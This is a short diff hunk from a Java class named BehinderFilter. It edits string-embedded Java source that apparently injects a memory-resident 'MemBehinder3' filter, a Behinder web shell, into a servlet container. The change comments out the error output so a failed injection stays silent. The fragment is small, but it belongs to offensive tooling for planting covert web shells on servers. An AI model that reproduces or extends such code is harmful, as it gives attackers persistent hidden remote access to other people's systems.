@@ -190,7 +190,7 @@ public class BehinderFilter {
                 "            this.response.setCharacterEncoding(this.cs);\n" +
                 "            output.append(this.addFilter(this,\"MemBehinder3\",this.tpath, this.request));\n" +
                 "        } catch (Exception var7) {\n" +
-                "            output.append(\"ERROR:// \" + var7.toString());\n" +
+                "            //output.append(\"ERROR:// \" + var7.toString());\n" +
                 "        }\n" +
                 "\n" +
                 "        try {\n" +
